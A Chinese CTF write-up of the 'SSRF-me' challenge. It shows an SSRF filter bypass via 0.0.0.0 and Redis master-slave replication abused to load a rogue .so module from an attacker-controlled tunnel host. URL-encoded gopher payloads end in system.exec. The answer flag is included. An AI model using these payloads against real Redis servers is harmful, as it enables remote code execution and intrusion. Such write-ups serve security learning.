---
title: SSRF进阶--Redis主从复制到RCE
categories:
- CTF
- Web安全
tags:
- Web安全
- SSRF
- Redis
---

## 什么是Redis主从复制？

{% asset_img image.png %}

假设有三台Redis服务：

Master

Slave1

Slave2

在主节点上的数据会同步至两个从节点，但是写入从节点的数据不会同步至主节点，这是redis数据库的基本原则。

### 主从复制实验：

[https://www.bilibili.com/video/BV1hw411k7DE/](https://www.bilibili.com/video/BV1hw411k7DE/?spm_id_from=333.337.search-card.all.click&vd_source=04cb824ed23d9e4a4c2e1c7cabf81790)

### Redis主从复制漏洞原理：

Redis 支持主从复制功能，从节点会向主节点发送 `PSYNC` 或 `SYNC` 命令请求同步数据。在这个过程中，主节点会将数据同步给从节点。攻击者可以利用这个机制，通过构造恶意的共享对象（`.so` 文件），并诱导从节点加载该恶意文件，从而在从节点上执行任意命令。

## 漏洞利用工具

1. URL编码
2. [https://github.com/n0b0dyCN/redis-rogue-server](https://github.com/n0b0dyCN/redis-rogue-server) （恶意服务器）
3. 花生壳内网穿透

## 题目：网鼎杯--玄武组--SSRF-me

```PHP
<?php
function check_inner_ip($url)
{
    $match_result=preg_match('/^(http|https|gopher|dict)?:\/\/.*(\/)?.*$/',$url);
    if (!$match_result)
    {
        die('url fomat error');
    }
    try
    {
        $url_parse=parse_url($url);
    }
    catch(Exception $e)
    {
        die('url fomat error');
        return false;
    }
    $hostname=$url_parse['host'];
    $ip=gethostbyname($hostname);
    $int_ip=ip2long($ip);
    return ip2long('127.0.0.0')>>24 == $int_ip>>24 || ip2long('10.0.0.0')>>24 == $int_ip>>24 || ip2long('172.16.0.0')>>20 == $int_ip>>20 || ip2long('192.168.0.0')>>16 == $int_ip>>16;
}

function safe_request_url($url)
{

    if (check_inner_ip($url))
    {
        echo $url.' is inner ip';
    }
    else
    {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        $output = curl_exec($ch);
        $result_info = curl_getinfo($ch);
        if ($result_info['redirect_url'])
        {
            safe_request_url($result_info['redirect_url']);
        }
        curl_close($ch);
        var_dump($output);
    }

}
if(isset($_GET['url'])){
    $url = $_GET['url'];
    if(!empty($url)){
        safe_request_url($url);
    }
}
else{
    highlight_file(__FILE__);
}
// Please visit hint.php locally.
?>
```

### 第一部分：

```PHP
<?php
function check_inner_ip($url)
{
    $match_result=preg_match('/^(http|https|gopher|dict)?:\/\/.*(\/)?.*$/',$url);
    if (!$match_result)
    {
        die('url fomat error');
    }
    try
    {
        $url_parse=parse_url($url);
    }
    catch(Exception $e)
    {
        die('url fomat error');
        return false;
    }
```

自定义函数检查url变量，只允许使用http https gopher dict协议，如果不满足条件则输出"url fomat error"，后面的不用管。

### 第二部分

```PHP
hostname=url_parse['host'];
ip=gethostbyname(hostname);
int_ip=ip2long(ip);
return ip2long('127.0.0.0')>>24 == $int_ip>>24 || ip2long('10.0.0.0')>>24 == $int_ip>>24 || ip2long('172.16.0.0')>>20 == $int_ip>>20 || ip2long('192.168.0.0')>>16 == $int_ip>>16;
}
function safe_request_url($url)
{

    if (check_inner_ip($url))
    {
        echo $url.' is inner ip';
    }
    else
    {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        $output = curl_exec($ch);
        $result_info = curl_getinfo($ch);
        if ($result_info['redirect_url'])
        {
            safe_request_url($result_info['redirect_url']);
        }
        curl_close($ch);
        var_dump($output);
    }

}
if(isset($_GET['url'])){
```

第二部分：判断私网地址，接着检查了url地址，如果url地址为上述判断的私网地址则进行过滤，否则则可以进行请求。

### 第三部分

没什么好说的，主要用来传参，主要的地方就一个，看注释，思路是可以包裹hint.php。

```PHP
if(isset($_GET['url'])){
    $url = $_GET['url'];
    if(!empty($url)){
        safe_request_url($url);
    }
}
else{
    highlight_file(__FILE__);
}
// Please visit hint.php locally.
?>
```

## 那么对于第一关如何进行绕过呢？

利用特性 0.0.0.0 可替代 127.0.0.1，所以传参为：

?url=http://0.0.0.0/hint.php 来查看 hint.php 中的内容

{% asset_img image_1.png %}

发现提示 redis 密码为 root。

## 接下来开始进行漏洞复现

首先先使用 python3 redis_rogue_server.py -v -path exp.so -lport 6379 启动本地的恶意服务器。

公网地址：jp1wg07031596.vicp.fun:26914 （公网地址映射为内网的6379端口）

{% asset_img image_2.png %}

接着设置备份路径：

```PHP
auth root
config set dir /tmp/
quit
```

使用url进行编码：

gopher%3A%2F%2F0.0.0.0%3A6379%2F_auth%2520root%250d%250aconfig%2520set%2520dir%2520%2Ftmp%2F%250d%250aquit

{% asset_img image_3.png %}

接着设置主从关系：

```PHP
auth root
config set dbfilename exp.so
slaveof 自己的ip 自己端口
quit
```

将url地址改为你的公网ip，解释一下这里的逻辑关系：

这里你的url地址是主服务器，靶机是从服务器，从服务器需要加载主服务器上的恶意文件（exp.so），so是共享文件，所以能被加载。

gopher%3A%2F%2F_auth%20root%0Aconfig%20set%20dbfilename%20exp.so%0Aslaveof%20jp1wg07031596.vicp.fun%3A26914%0Aquit

可看到数据已进行同步：

{% asset_img image_4.png %}

设置完主从关系之后加载恶意模块：

```PHP
gopher://0.0.0.0:6379/_auth root
module load ./exp.so
quit
```

二次编码后：

gopher://0.0.0.0:6379/_auth%2520root%250d%250amodule%2520load%2520./exp.so%250d%250aquit

{% asset_img image_5.png %}

接着关闭主从同步：

```PHP
gopher://0.0.0.0:6379/_auth root
slaveof NO ONE
quit
```

二次编码：

gopher://0.0.0.0:6379/_auth%2520root%250d%250aslaveof%2520NO%2520ONE%250d%250aquit

最终：命令执行

```PHP
gopher://0.0.0.0:6379/_auth root
system.exec "cat /flag"
quit
```

二次编码：gopher://0.0.0.0:6379/_auth%2520root%250d%250asystem.exec%2520%2522cat%2520%252Fflag%2522%250d%250aquit

{% asset_img image_6.png %}

NSSCTF{b094a22c-4190-4176-bd5d-764e9239c35e}
